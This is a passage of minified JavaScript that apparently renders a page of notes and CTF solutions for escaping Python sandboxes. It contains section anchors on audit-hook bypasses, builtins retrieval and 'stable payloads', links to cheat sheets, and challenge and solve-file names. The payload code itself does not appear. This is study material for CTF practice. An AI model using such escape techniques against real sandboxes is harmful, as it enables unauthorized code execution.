Db=o(Fn);zp=t(Db,"A",{href:!0});var Ib=o(zp);qi=i(Ib,"Internet Festival 2023 CTF Finals: prison"),Ib.forEach(n),Db.forEach(n),Wl=k(s),Rn=t(s,"UL",{class:!0});var jb=o(Rn);pe=t(jb,"LI",{});var Nb=o(pe);te=t(Nb,"CODE",{});var Pb=o(te);zi=i(Pb,"prison.py"),Pb.forEach(n),Nb.forEach(n),jb.forEach(n),Yl=k(s),Dn=t(s,"PRE",{class:!0});var N1=o(Dn);N1.forEach(n),Gl=k(s),In=t(s,"UL",{class:!0});var Hb=o(In);oe=t(Hb,"LI",{});var Ub=o(oe);ee=t(Ub,"CODE",{});var Mb=o(ee);Wi=i(Mb,"solve.py"),Mb.forEach(n),Ub.forEach(n),Hb.forEach(n),Vl=k(s),jn=t(s,"PRE",{class:!0});var P1=o(jn);P1.forEach(n),$l=k(s),Nn=t(s,"H3",{id:!0});var Bb=o(Nn);Wp=t(Bb,"A",{href:!0});var Sb=o(Wp);Yi=i(Sb,"WACON 2023 Prequal: ScavengerHunt"),Sb.forEach(n),Bb.forEach(n),Jl=k(s),Pn=t(s,"UL",{class:!0});var qb=o(Pn);ce=t(qb,"LI",{});var zb=o(ce);le=t(zb,"CODE",{});var Wb=o(le);Gi=i(Wb,"prob.py"),Wb.forEach(n),zb.forEach(n),qb.forEach(n),Kl=k(s),Hn=t(s,"PRE",{class:!0});var H1=o(Hn);H1.forEach(n),Zl=k(s),Un=t(s,"UL",{class:!0});var Yb=o(Un);ue=t(Yb,"LI",{});var Gb=o(ue);ke=t(Gb,"CODE",{});var Vb=o(ke);Vi=i(Vb,"secret.py"),Vb.forEach(n),Gb.forEach(n),Yb.forEach(n),Xl=k(s),Mn=t(s,"PRE",{class:!0});var U1=o(Mn);U1.forEach(n),Ql=k(s),Bn=t(s,"UL",{class:!0});var $b=o(Bn);re=t($b,"LI",{});var Jb=o(re);ie=t(Jb,"CODE",{});var Kb=o(ie);$i=i(Kb,"solve.py"),Kb.forEach(n),Jb.forEach(n),$b.forEach(n),su=k(s),Sn=t(s,"PRE",{class:!0});var M1=o(Sn);M1.forEach(n),nu=k(s),qn=t(s,"H3",{id:!0});var Zb=o(qn);Yp=t(Zb,"A",{href:!0});var Xb=o(Yp);Ji=i(Xb,"CrewCTF 2023: starship-1"),Xb.forEach(n),Zb.forEach(n),au=k(s),zn=t(s,"UL",{class:!0});var Qb=o(zn);_e=t(Qb,"LI",{});var sy=o(_e);de=t(sy,"CODE",{});var ny=o(de);Ki=i(ny,"sandbox.py"),ny.forEach(n),sy.forEach(n),Qb.forEach(n),pu=k(s),Wn=t(s,"PRE",{class:!0});var B1=o(Wn);B1.forEach(n),tu=k(s),Yn=t(s,"UL",{class:!0});var ay=o(Yn);fe=t(ay,"LI",{});var py=o(fe);me=t(py,"CODE",{});var ty=o(me);Zi=i(ty,"solve.py"),ty.forEach(n),py.forEach(n),ay.forEach(n),ou=k(s),Gn=t(s,"PRE",{class:!0});var S1=o(Gn);S1.forEach(n),eu=k(s),Vn=t(s,"H3",{id:!0});var oy=o(Vn);Gp=t(oy,"A",{href:!0});var ey=o(Gp);Xi=i(ey,"CrewCTF 2023: starship"),ey.forEach(n),oy.forEach(n),cu=k(s),$n=t(s,"UL",{class:!0});var cy=o($n);be=t(cy,"LI",{});var ly=o(be);ye=t(ly,"CODE",{});var uy=o(ye);Qi=i(uy,"server.py"),uy.forEach(n),ly.forEach(n),cy.forEach(n),lu=k(s),Jn=t(s,"PRE",{class:!0});var q1=o(Jn);q1.forEach(n),uu=k(s),Kn=t(s,"UL",{class:!0});var ky=o(Kn);ge=t(ky,"LI",{});var ry=o(ge);we=t(ry,"CODE",{});var iy=o(we);s_=i(iy,"solve.py"),iy.forEach(n),ry.forEach(n),ky.forEach(n),ku=k(s),Zn=t(s,"PRE",{class:!0});var z1=o(Zn);z1.forEach(n),ru=k(s),Xn=t(s,"H3",{id:!0});var _y=o(Xn);Vp=t(_y,"A",{href:!0});var dy=o(Vp);n_=i(dy,"CrewCTF 2023: setjail"),dy.forEach(n),_y.forEach(n),iu=k(s),Qn=t(s,"UL",{class:!0});var fy=o(Qn);ve=t(fy,"LI",{});var my=o(ve);Ee=t(my,"CODE",{});var by=o(Ee);a_=i(by,"main.py"),by.forEach(n),my.forEach(n),fy.forEach(n),_u=k(s),sa=t(s,"PRE",{class:!0});var W1=o(sa);W1.forEach(n),du=k(s),na=t(s,"UL",{class:!0});var yy=o(na);he=t(yy,"LI",{});var gy=o(he);xe=t(gy,"CODE",{});var wy=o(xe);p_=i(wy,"solve.py"),wy.forEach(n),gy.forEach(n),yy.forEach(n),fu=k(s),aa=t(s,"PRE",{class:!0});var Y1=o(aa);Y1.forEach(n),mu=k(s),pa=t(s,"H3",{id:!0});var vy=o(pa);$p=t(vy,"A",{href:!0});var Ey=o($p);t_=i(Ey,"CrewCTF 2023: jailpie"),Ey.forEach(n),vy.forEach(n),bu=k(s),ta=t(s,"UL",{class:!0});var hy=o(ta);Ce=t(hy,"LI",{});var xy=o(Ce);Le=t(xy,"CODE",{});var Cy=o(Le);o_=i(Cy,"server.py"),Cy.forEach(n),xy.forEach(n),hy.forEach(n),yu=k(s),oa=t(s,"PRE",{class:!0});var G1=o(oa);G1.forEach(n),gu=k(s),ea=t(s,"UL",{class:!0});var Ly=o(ea);Te=t(Ly,"LI",{});var Ty=o(Te);Ae=t(Ty,"CODE",{});var Ay=o(Ae);e_=i(Ay,"solve.py"),Ay.forEach(n),Ty.forEach(n),Ly.forEach(n),wu=k(s),ca=t(s,"PRE",{class:!0});var V1=o(ca);V1.forEach(n),vu=k(s),la=t(s,"H3",{id:!0});var Oy=o(la);Jp=t(Oy,"A",{href:!0});var Fy=o(Jp);c_=i(Fy,"SEETF 2023: Another PyJail"),Fy.forEach(n),Oy.forEach(n),Eu=k(s),ua=t(s,"UL",{class:!0});var Ry=o(ua);Oe=t(Ry,"LI",{});var Dy=o(Oe);Fe=t(Dy,"CODE",{});var Iy=o(Fe);l_=i(Iy,"server.py"),Iy.forEach(n),Dy.forEach(n),Ry.forEach(n),hu=k(s),ka=t(s,"PRE",{class:!0});var $1=o(ka);$1.forEach(n),xu=k(s),ra=t(s,"UL",{class:!0});var jy=o(ra);Re=t(jy,"LI",{});var Ny=o(Re);De=t(Ny,"CODE",{});var Py=o(De);u_=i(Py,"solve.py"),Py.forEach(n),Ny.forEach(n),jy.forEach(n),Cu=k(s),ia=t(s,"PRE",{class:!0});var J1=o(ia);J1.forEach(n),Lu=k(s),_a=t(s,"H3",{id:!0});var Hy=o(_a);Kp=t(Hy,"A",{href:!0});var Uy=o(Kp);k_=i(Uy,"BYUCTF 2023: Builtins 1"),Uy.forEach(n),Hy.forEach(n),Tu=k(s),da=t(s,"UL",{class:!0});var My=o(da);Ie=t(My,"LI",{});var By=o(Ie);je=t(By,"CODE",{});var Sy=o(je);r_=i(Sy,"b1.py"),Sy.forEach(n),By.forEach(n),My.forEach(n),Au=k(s),fa=t(s,"PRE",{class:!0});var K1=o(fa);K1.forEach(n),Ou=k(s),ma=t(s,"UL",{class:!0});var qy=o(ma);Ne=t(qy,"LI",{});var zy=o(Ne);Pe=t(zy,"CODE",{});var Wy=o(Pe);i_=i(Wy,"solve.py"),Wy.forEach(n),zy.forEach(n),qy.forEach(n),Fu=k(s),ba=t(s,"PRE",{class:!0});var Z1=o(ba);Z1.forEach(n),Ru=k(s),ya=t(s,"H3",{id:!0});var Yy=o(ya);Zp=t(Yy,"A",{href:!0});var Gy=o(Zp);__=i(Gy,"BYUCTF 2023: Builtins 2"),Gy.forEach(n),Yy.forEach(n),Du=k(s),ga=t(s,"UL",{class:!0});var Vy=o(ga);He=t(Vy,"LI",{});var $y=o(He);Ue=t($y,"CODE",{});var Jy=o(Ue);d_=i(Jy,"b2.py"),Jy.forEach(n),$y.forEach(n),Vy.forEach(n),Iu=k(s),wa=t(s,"PRE",{class:!0});var X1=o(wa);X1.forEach(n),ju=k(s),va=t(s,"UL",{class:!0});var Ky=o(va);Me=t(Ky,"LI",{});var Zy=o(Me);Be=t(Zy,"CODE",{});var Xy=o(Be);f_=i(Xy,"solve.py"),Xy.forEach(n),Zy.forEach(n),Ky.forEach(n),Nu=k(s),Ea=t(s,"PRE",{class:!0});var Q1=o(Ea);Q1.forEach(n),Pu=k(s),ha=t(s,"H3",{id:!0});var Qy=o(ha);Xp=t(Qy,"A",{href:!0});var sg=o(Xp);m_=i(sg,"BYUCTF 2023: a-z0-9"),sg.forEach(n),Qy.forEach(n),Hu=k(s),xa=t(s,"UL",{class:!0});var ng=o(xa);Se=t(ng,"LI",{});var ag=o(Se);qe=t(ag,"CODE",{});var pg=o(qe);b_=i(pg,"a-z0-9.py"),pg.forEach(n),ag.forEach(n),ng.forEach(n),Uu=k(s),Ca=t(s,"PRE",{class:!0});var sw=o(Ca);sw.forEach(n),Mu=k(s),La=t(s,"UL",{class:!0});var tg=o(La);ze=t(tg,"LI",{});var og=o(ze);We=t(og,"CODE",{});var eg=o(We);y_=i(eg,"solve.py"),eg.forEach(n),og.forEach(n),tg.forEach(n),Bu=k(s),Ta=t(s,"PRE",{class:!0});var nw=o(Ta);nw.forEach(n),Su=k(s),Aa=t(s,"H3",{id:!0});var cg=o(Aa);Qp=t(cg,"A",{href:!0});var lg=o(Qp);g_=i(lg,"BYUCTF 2023: Leet 2"),lg.forEach(n),cg.forEach(n),qu=k(s),Oa=t(s,"UL",{class:!0});var ug=o(Oa);Ye=t(ug,"LI",{});var kg=o(Ye);Ge=t(kg,"CODE",{});var rg=o(Ge);w_=i(rg,"leet2.py"),rg.forEach(n),kg.forEach(n),ug.forEach(n),zu=k(s),Fa=t(s,"PRE",{class:!0});var aw=o(Fa);aw.forEach(n),Wu=k(s),Ra=t(s,"UL",{class:!0});var ig=o(Ra);Ve=t(ig,"LI",{});var _g=o(Ve);$e=t(_g,"CODE",{});var dg=o($e);v_=i(dg,"solve.py"),dg.forEach(n),_g.forEach(n),ig.forEach(n),Yu=k(s),Da=t(s,"PRE",{class:!0});var pw=o(Da);pw.forEach(n),Gu=k(s),Ia=t(s,"H3",{id:!0});var fg=o(Ia);st=t(fg,"A",{href:!0});var mg=o(st);E_=i(mg,"BYUCTF 2023: abcdefghijklm"),mg.forEach(n),fg.forEach(n),Vu=k(s),ja=t(s,"UL",{class:!0});var bg=o(ja);Je=t(bg,"LI",{});var yg=o(Je);Ke=t(yg,"CODE",{});var gg=o(Ke);h_=i(gg,"abcdefghijklm.py"),gg.forEach(n),yg.forEach(n),bg.forEach(n),$u=k(s),Na=t(s,"PRE",{class:!0});var tw=o(Na);tw.forEach(n),Ju=k(s),Pa=t(s,"UL",{class:!0});var wg=o(Pa);Ze=t(wg,"LI",{});var vg=o(Ze);Xe=t(vg,"CODE",{});var Eg=o(Xe);x_=i(Eg,"solve.py"),Eg.forEach(n),vg.forEach(n),wg.forEach(n),Ku=k(s),Ha=t(s,"PRE",{class:!0});var ow=o(Ha);ow.forEach(n),Zu=k(s),Ua=t(s,"H3",{id:!0});var hg=o(Ua);nt=t(hg,"A",{href:!0});var xg=o(nt);C_=i(xg,"BYUCTF 2023: nopqrstuvwxyz"),xg.forEach(n),hg.forEach(n),Xu=k(s),Ma=t(s,"UL",{class:!0});var Cg=o(Ma);Qe=t(Cg,"LI",{});var Lg=o(Qe);sc=t(Lg,"CODE",{});var Tg=o(sc);L_=i(Tg,"nopqrstuvwxyz.py"),Tg.forEach(n),Lg.forEach(n),Cg.forEach(n),Qu=k(s),Ba=t(s,"PRE",{class:!0});var ew=o(Ba);ew.forEach(n),sk=k(s),Sa=t(s,"UL",{class:!0});var Ag=o(Sa);nc=t(Ag,"LI",{});var Og=o(nc);ac=t(Og,"CODE",{});var Fg=o(ac);T_=i(Fg,"solve.py"),Fg.forEach(n),Og.forEach(n),Ag.forEach(n),nk=k(s),qa=t(s,"PRE",{class:!0});var cw=o(qa);cw.forEach(n),ak=k(s),za=t(s,"H2",{id:!0});var Rg=o(za);at=t(Rg,"A",{href:!0});var Dg=o(at);A_=i(Dg,"References"),Dg.forEach(n),Rg.forEach(n),pk=k(s),h=t(s,"UL",{class:!0});var ct=o(h);pc=t(ct,"LI",{});var Ig=o(pc);U=t(Ig,"A",{href:!0,rel:!0,class:!0,target:!0});var jg=o(U);O_=i(jg,"https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes"),jg.forEach(n),Ig.forEach(n),F_=k(ct),tc=t(ct,"LI",{});var Ng=o(tc);M=t(Ng,"A",{href:!0,rel:!0,class:!0,target:!0});var Pg=o(M);R_=i(Pg,"https://github.com/salvatore-abello/python-ctf-cheatsheet/blob/main/pyjails/README.md"),Pg.forEach(n),Ng.forEach(n),D_=k(ct),oc=t(ct,"LI",{});var Hg=o(oc);B=t(Hg,"A",{href:!0,rel:!0,class:!0,target:!0});var Ug=o(B);I_=i(Ug,"https://jbnrz.com.cn/index.php/2024/05/19/pyjail/"),Ug.forEach(n),Hg.forEach(n),ct.forEach(n),this.h()},h(){l(m,"href","#sinks"),l(_,"id","sinks"),l(Ga,"href","#retrieving-builtins"),l($,"id","retrieving-builtins"),l(J,"class","language-py"),l(Va,"href","#good-to-know-built-in-functions-and-methods"),l(K,"id","good-to-know-built-in-functions-and-methods"),l(Z,"class","language-py"),l($a,"href","#subclasses"),l(X,"id","subclasses"),l(Q,"class","language-py"),l(Ja,"href","#popular-modules"),l(ss,"id","popular-modules"),l(ns,"class","language-py"),l(Ka,"href","#bypasses-and-payloads"),l(as,"id","bypasses-and-payloads"),l(Za,"href","#decorators"),l(ps,"id","decorators"),l(ts,"class","language-py"),l(Xa,"href","#unicode-bypass"),l(os,"id","unicode-bypass"),l(es,"class","language-py"),l(Qa,"href","#audithook-bypass"),l(cs,"id","audithook-bypass"),l(ls,"class","language-py"),l(us,"class","language-py"),l(sp,"href","#assigning-attributes-and-variables"),l(ks,"id","assigning-attributes-and-variables"),l(rs,"class","language-py"),l(is,"class","language-py"),l(np,"href","#getting-attributes"),l(_s,"id","getting-attributes"),l(ds,"class","language-py"),l(fs,"class","language-py"),l(ap,"href","#running-functions-and-methods-without-parenthesis"),l(ms,"id","running-functions-and-methods-without-parenthesis"),l(bs,"class","language-py"),l(ys,"class","language-py"),l(pp,"href","#deleting-variables"),l(gs,"id","deleting-variables"),l(ws,"class","language-py"),l(tp,"href","#general-stuff"),l(vs,"id","general-stuff"),l(op,"href","#environment-variables"),l(Es,"id","environment-variables"),l(F,"href","https://www.elttam.com/blog/env/#python"),l(F,"rel","noopener"),l(F,"class","text-link"),l(F,"target","_blank"),l(R,"href","https://crazymanarmy.github.io/2023/01/18/idek-2022-CTF-Pyjail-Pyjail-Revenge-Writeup/index.html"),l(R,"rel","noopener"),l(R,"class","text-link"),l(R,"target","_blank"),l(q,"class","list"),l(O,"class","list"),l(ep,"href","#magic-methods"),l(xs,"id","magic-methods"),l(D,"href","https://rszalski.github.io/magicmethods/#appendix1"),l(D,"rel","noopener"),l(D,"class","text-link"),l(D,"target","_blank"),l(Cs,"class","list"),l(cp,"href","#help"),l(Ls,"id","help"),l(v,"class","list"),l(I,"href","https://github.com/SECCON/Beginners_CTF_2022/blob/main/misc/hitchhike4b/writeup.md"),l(I,"rel","noopener"),l(I,"class","text-link"),l(I,"target","_blank"),l(g,"class","list"),l(Ts,"class","language-py"),l(dp,"href","#stable-payloads"),l(As,"id","stable-payloads"),l(Os,"class","language-py"),l(fp,"href","#finding-sinks-from-modules"),l(Fs,"id","finding-sinks-from-modules"),l(N,"href","https://github.com/search?q=repo%3Apython%2Fcpython+path%3ALib+%2Ffrom+os+import+environ%2F&type=code"),l(N,"rel","noopener"),l(N,"class","text-link"),l(N,"target","_blank"),l(bp,"class","list"),l(P,"href","https://github.com/search?q=repo%3Apython%2Fcpython+path%3ALib+%2Fimport+sys%2F&type=code"),l(P,"rel","noopener"),l(P,"class","text-link"),l(P,"target","_blank"),l(gp,"class","list"),l(j,"class","list"),l(wp,"href","#generic-classes--bullet-points"),l(Rs,"id","generic-classes--bullet-points"),l(vp,"class","list"),l(z,"class","list"),l(C,"class","list"),l(L,"class","list"),l(Tp,"class","list"),l(T,"class","list"),l(Fp,"class","list"),l(Dp,"class","list"),l(W,"class","list"),l(f,"class","list"),l(Ip,"href","#ctf"),l(Is,"id","ctf"),l(jp,"href","#seccon-ctf-13-1linepyjail"),l(js,"id","seccon-ctf-13-1linepyjail"),l(Ns,"class","list"),l(Ps,"class","language-py"),l(Hs,"class","list"),l(Us,"class","language-py"),l(Np,"href","#idekctf-2024-crator"),l(Ms,"id","idekctf-2024-crator"),l(Bs,"class","list"),l(Ss,"class","language-py"),l(qs,"class","list"),l(zs,"class","language-py"),l(Ws,"class","list"),l(Ys,"class","language-py"),l(Pp,"href","#uiuctf-2024-astea"),l(Gs,"id","uiuctf-2024-astea"),l(Vs,"class","list"),l($s,"class","language-py"),l(Js,"class","list"),l(Ks,"class","language-py"),l(Hp,"href","#vsctf-2024-llama-jail-revenge"),l(Zs,"id","vsctf-2024-llama-jail-revenge"),l(Xs,"class","list"),l(Qs,"class","language-py"),l(sn,"class","list"),l(nn,"class","language-py"),l(an,"class","list"),l(pn,"class","language-py"),l(Up,"href","#uoftctf-2024-zero"),l(tn,"id","uoftctf-2024-zero"),l(on,"class","list"),l(en,"class","language-py"),l(cn,"class","list"),l(ln,"class","language-py"),l(Mp,"href","#glacierctf-2023-avatar"),l(un,"id","glacierctf-2023-avatar"),l(kn,"class","list"),l(rn,"class","language-py"),l(_n,"class","list"),l(dn,"class","language-py"),l(Bp,"href","#tfc-ctf-2023-my-third-calculator"),l(fn,"id","tfc-ctf-2023-my-third-calculator"),l(mn,"class","list"),l(bn,"class","language-py"),l(yn,"class","list"),l(gn,"class","language-py"),l(Sp,"href","#equinor-ctf-2023-dis-is-it"),l(wn,"id","equinor-ctf-2023-dis-is-it"),l(vn,"class","list"),l(En,"class","language-py"),l(hn,"class","list"),l(xn,"class","language-py"),l(qp,"href","#37c3-potluck-ctf-tacocat"),l(Cn,"id","37c3-potluck-ctf-tacocat"),l(Ln,"class","list"),l(Tn,"class","language-py"),l(An,"class","list"),l(On,"class","language-py"),l(zp,"href","#internet-festival-2023-ctf-finals-prison"),l(Fn,"id","internet-festival-2023-ctf-finals-prison"),l(Rn,"class","list"),l(Dn,"class","language-py"),l(In,"class","list"),l(jn,"class","language-py"),l(Wp,"href","#wacon-2023-prequal-scavengerhunt"),l(Nn,"id","wacon-2023-prequal-scavengerhunt"),l(Pn,"class","list"),l(Hn,"class","language-py"),l(Un,"class","list"),l(Mn,"class","language-py"),l(Bn,"class","list"),l(Sn,"class","language-py"),l(Yp,"href","#crewctf-2023-starship-1"),l(qn,"id","crewctf-2023-starship-1"),l(zn,"class","list"),l(Wn,"class","language-py"),l(Yn,"class","list"),l(Gn,"class","language-py"),l(Gp,"href","#crewctf-2023-starship"),l(Vn,"id","crewctf-2023-starship"),l($n,"class","list"),l(Jn,"class","language-py"),l(Kn,"class","list"),l(Zn,"class","language-py"),l(Vp,"href","#crewctf-2023-setjail"),l(Xn,"id","crewctf-2023-setjail"),l(Qn,"class","list"),l(sa,"class","language-py"),l(na,"class","list"),l(aa,"class","language-py"),l($p,"href","#crewctf-2023-jailpie"),l(pa,"id","crewctf-2023-jailpie"),l(ta,"class","list"),l(oa,"class","language-py"),l(ea,"class","list"),l(ca,"class","language-py"),l(Jp,"href","#seetf-2023-another-pyjail"),l(la,"id","seetf-2023-another-pyjail"),l(ua,"class","list"),l(ka,"class","language-py"),l(ra,"class","list"),l(ia,"class","language-py"),l(Kp,"href","#byuctf-2023-builtins-1"),l(_a,"id","byuctf-2023-builtins-1"),l(da,"class","list"),l(fa,"class","language-py"),l(ma,"class","list"),l(ba,"class","language-py"),l(Zp,"href","#byuctf-2023-builtins-2"),l(ya,"id","byuctf-2023-builtins-2"),l(ga,"class","list"),l(wa,"class","language-py"),l(va,"class","list"),l(Ea,"class","language-py"),l(Xp,"href","#byuctf-2023-a-z0-9"),l(ha,"id","byuctf-2023-a-z0-9"),l(xa,"class","list"),l(Ca,"class","language-py"),l(La,"class","list"),l(Ta,"class","language-py"),l(Qp,"href","#byuctf-2023-leet-2"),l(Aa,"id","byuctf-2023-leet-2"),l(Oa,"class","list"),l(Fa,"class","language-py"),l(Ra,"class","list"),l(Da,"class","language-py"),l(st,"href","#byuctf-2023-abcdefghijklm"),l(Ia,"id","byuctf-2023-abcdefghijklm"),l(ja,"class","list"),l(Na,"class","language-py"),l(Pa,"class","list"),l(Ha,"class","language-py"),l(nt,"href","#byuctf-2023-nopqrstuvwxyz"),l(Ua,"id","byuctf-2023-nopqrstuvwxyz"),l(Ma,"class","list"),l(Ba,"class","language-py"),l(Sa,"class","list"),l(qa,"class","language-py"),l(at,"href","#references"),l(za,"id","references"),l(U,"href","https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes"),l(U,"rel","noopener"),l(U,"class","text-link"),l(U,"target","_blank"),l(M,"href","https://github.com/salvatore-abello/python-ctf-cheatsheet/blob/main/pyjails/README.md"),l(M,"rel","noopener"),l(M,"class","text-link"),l(M,"target","_blank"),l(B,"href","https://jbnrz.com.cn/index.php/2024/05/19/pyjail/"),l(B,"rel","noopener"),l(B,"class","text-link"),l(B,"target","_blank"),l(h,"class","list")},m(s,e){c(s,d,e),a(d,w),a(w,A),c(s,S,e),c(s,_,e),a(_,m),a(m,Ya),c(s,ec,e),c(s,$,e),a($,Ga),a(Ga,rk),c(s,cc,e),c(s,J,e),J.innerHTML=qg,c(s,lc,e),c(s,K,e),a(K,Va),a(Va,ik),c(s,uc,e),c(s,Z,e),Z.innerHTML=zg,c(s,kc,e),c(s,X,e),a(X,$a),a($a,_k),c(s,rc,e),c(s,Q,e),Q.innerHTML=Wg,c(s,ic,e),c(s,ss,e),a(ss,Ja),a(Ja,dk),c(s,_c,e),c(s,ns,e),ns.innerHTML=Yg,c(s,dc,e),c(s,as,e),a(as,Ka),a(Ka,fk),c(s,fc,e),c(s,ps,e),a(ps,Za),a(Za,mk),c(s,mc,e),c(s,ts,e),ts.innerHTML=Gg,c(s,bc,e),c(s,os,e),a(os,Xa),a(Xa,bk),c(s,yc,e),c(s,es,e),es.innerHTML=Vg,c(s,gc,e),c(s,cs,e),a(cs,Qa),a(Qa,yk),c(s,wc,e),c(s,ls,e),ls.innerHTML=$g,c(s,vc,e),c(s,us,e),us.innerHTML=Jg,c(s,Ec,e),c(s,ks,e),a(ks,sp),a(sp,gk),c(s,hc,e),c(s,rs,e),rs.innerHTML=Kg,c(s,xc,e),c(s,is,e),is.innerHTML=Zg,c(s,Cc,e),c(s,_s,e),a(_s,np),a(np,wk),c(s,Lc,e),c(s,ds,e),ds.innerHTML=Xg,c(s,Tc,e),c(s,fs,e),fs.innerHTML=Qg,c(s,Ac,e),c(s,ms,e),a(ms,ap),a(ap,vk),c(s,Oc,e),c(s,bs,e),bs.innerHTML=s2,c(s,Fc,e),c(s,ys,e),ys.innerHTML=n2,c(s,Rc,e),c(s,gs,e),a(gs,pp),a(pp,Ek),c(s,Dc,e),c(s,ws,e),ws.innerHTML=a2,c(s,Ic,e),c(s,vs,e),a(vs,tp),a(tp,hk),c(s,jc,e),c(s,Es,e),a(Es,op),a(op,xk),c(s,Nc,e),c(s,O,e),a(O,lt),a(lt,F),a(F,Ck),a(O,Lk),a(O,b),a(b,ut),a(ut,Tk),a(b,Ak),a(b,kt),a(kt,Ok),a(b,Fk),a(b,rt),a(rt,Rk),a(b,Dk),a(b,it),a(it,Ik),a(b,jk),a(b,_t),a(_t,Nk),a(b,q),a(q,dt),a(dt,ft),a(ft,Pk),a(q,Hk),a(q,hs),a(hs,mt),a(mt,Uk),a(hs,Mk),a(hs,R),a(R,Bk),c(s,Pc,e),c(s,xs,e),a(xs,ep),a(ep,Sk),c(s,Hc,e),c(s,Cs,e),a(Cs,bt),a(bt,D),a(D,qk),c(s,Uc,e),c(s,Ls,e),a(Ls,cp),a(cp,zk),c(s,Mc,e),c(s,g,e),a(g,yt),a(yt,Wk),a(g,Yk),a(g,lp),a(lp,Gk),a(lp,gt),a(gt,Vk),a(g,$k),a(g,up),a(up,Jk),a(up,v),a(v,kp),a(kp,wt),a(wt,Kk),a(kp,Zk),a(v,Xk),a(v,rp),a(rp,vt),a(vt,Qk),a(rp,sr),a(v,nr),a(v,ip),a(ip,Et),a(Et,ar),a(ip,pr),a(v,tr),a(v,E),a(E,ht),a(ht,or),a(E,er),a(E,xt),a(xt,cr),a(E,lr),a(E,Ct),a(Ct,ur),a(E,kr),a(E,Lt),a(Lt,rr),a(g,ir),a(g,_p),a(_p,_r),a(_p,I),a(I,dr),c(s,Bc,e),c(s,Ts,e),Ts.innerHTML=p2,c(s,Sc,e),c(s,As,e),a(As,dp),a(dp,fr),c(s,qc,e),c(s,Os,e),Os.innerHTML=t2,c(s,zc,e),c(s,Fs,e),a(Fs,fp),a(fp,mr),c(s,Wc,e),c(s,j,e),a(j,mp),a(mp,N),a(N,br),a(mp,bp),a(bp,Tt),a(Tt,At),a(At,yr),a(j,gr),a(j,yp),a(yp,P),a(P,wr),a(yp,gp),a(gp,Ot),a(Ot,Ft),a(Ft,vr),c(s,Yc,e),c(s,Rs,e),a(Rs,wp),a(wp,Er),c(s,Gc,e),c(s,f,e),a(f,H),a(H,Rt),a(Rt,hr),a(H,xr),a(H,Dt),a(Dt,Cr),a(H,Lr),a(H,vp),a(vp,Ep),a(Ep,It),a(It,Tr),a(Ep,Ar),a(f,Or),a(f,hp),a(hp,jt),a(jt,Fr),a(hp,z),a(z,Nt),a(Nt,Pt),a(Pt,Rr),a(z,Dr),a(z,Ht),a(Ht,Ut),a(Ut,Ir),a(f,jr),a(f,xp),a(xp,Mt),a(Mt,Nr),a(xp,C),a(C,Bt),a(Bt,St),a(St,Pr),a(C,Hr),a(C,qt),a(qt,zt),a(zt,Ur),a(C,Mr),a(C,Wt),a(Wt,Yt),a(Yt,Br),a(f,Sr),a(f,Cp),a(Cp,Gt),a(Gt,qr),a(Cp,L),a(L,Vt),a(Vt,$t),a($t,zr),a(L,Wr),a(L,Jt),a(Jt,Kt),a(Kt,Yr),a(L,Gr),a(L,Zt),a(Zt,Xt),a(Xt,Vr),a(f,$r),a(f,Lp),a(Lp,Qt),a(Qt,Jr),a(Lp,Tp),a(Tp,so),a(so,no),a(no,Kr),a(f,Zr),a(f,Ap),a(Ap,ao),a(ao,Xr),a(Ap,T),a(T,po),a(po,to),a(to,Qr),a(T,si),a(T,oo),a(oo,eo),a(eo,ni),a(T,ai),a(T,co),a(co,lo),a(lo,pi),a(f,ti),a(f,Ds),a(Ds,uo),a(uo,oi),a(Ds,ei),a(Ds,W),a(W,Op),a(Op,ko),a(ko,ci),a(Op,Fp),a(Fp,ro),a(ro,io),a(io,li),a(W,ui),a(W,Rp),a(Rp,_o),a(_o,ki),a(Rp,Dp),a(Dp,fo),a(fo,mo),a(mo,ri),c(s,Vc,e),c(s,Is,e),a(Is,Ip),a(Ip,ii),c(s,$c,e),c(s,js,e),a(js,jp),a(jp,_i),c(s,Jc,e),c(s,Ns,e),a(Ns,bo),a(bo,yo),a(yo,di),c(s,Kc,e),c(s,Ps,e),Ps.innerHTML=o2,c(s,Zc,e),c(s,Hs,e),a(Hs,go),a(go,wo),a(wo,fi),c(s,Xc,e),c(s,Us,e),Us.innerHTML=e2,c(s,Qc,e),c(s,Ms,e),a(Ms,Np),a(Np,mi),c(s,sl,e),c(s,Bs,e),a(Bs,vo),a(vo,Eo),a(Eo,bi),c(s,nl,e),c(s,Ss,e),Ss.innerHTML=c2,c(s,al,e),c(s,qs,e),a(qs,ho),a(ho,xo),a(xo,yi),c(s,pl,e),c(s,zs,e),zs.innerHTML=l2,c(s,tl,e),c(s,Ws,e),a(Ws,Co),a(Co,Lo),a(Lo,gi),c(s,ol,e),c(s,Ys,e),Ys.innerHTML=u2,c(s,el,e),c(s,Gs,e),a(Gs,Pp),a(Pp,wi),c(s,cl,e),c(s,Vs,e),a(Vs,To),a(To,Ao),a(Ao,vi),c(s,ll,e),c(s,$s,e),$s.innerHTML=k2,c(s,ul,e),c(s,Js,e),a(Js,Oo),a(Oo,Fo),a(Fo,Ei),c(s,kl,e),c(s,Ks,e),Ks.innerHTML=r2,c(s,rl,e),c(s,Zs,e),a(Zs,Hp),a(Hp,hi),c(s,il,e),c(s,Xs,e),a(Xs,Ro),a(Ro,Do),a(Do,xi),c(s,_l,e),c(s,Qs,e),Qs.innerHTML=i2,c(s,dl,e),c(s,sn,e),a(sn,Io),a(Io,jo),a(jo,Ci),c(s,fl,e),c(s,nn,e),nn.innerHTML=_2,c(s,ml,e),c(s,an,e),a(an,No),a(No,Po),a(Po,Li),c(s,bl,e),c(s,pn,e),pn.innerHTML=d2,c(s,yl,e),c(s,tn,e),a(tn,Up),a(Up,Ti),c(s,gl,e),c(s,on,e),a(on,Ho),a(Ho,Uo),a(Uo,Ai),c(s,wl,e),c(s,en,e),en.innerHTML=f2,c(s,vl,e),c(s,cn,e),a(cn,Mo),a(Mo,Bo),a(Bo,Oi),c(s,El,e),c(s,ln,e),ln.innerHTML=m2,c(s,hl,e),c(s,un,e),a(un,Mp),a(Mp,Fi),c(s,xl,e),c(s,kn,e),a(kn,So),a(So,qo),a(qo,Ri),c(s,Cl,e),c(s,rn,e),rn.innerHTML=b2,c(s,Ll,e),c(s,_n,e),a(_n,zo),a(zo,Wo),a(Wo,Di),c(s,Tl,e),c(s,dn,e),dn.innerHTML=y2,c(s,Al,e),c(s,fn,e),a(fn,Bp),a(Bp,Ii),c(s,Ol,e),c(s,mn,e),a(mn,Yo),a(Yo,G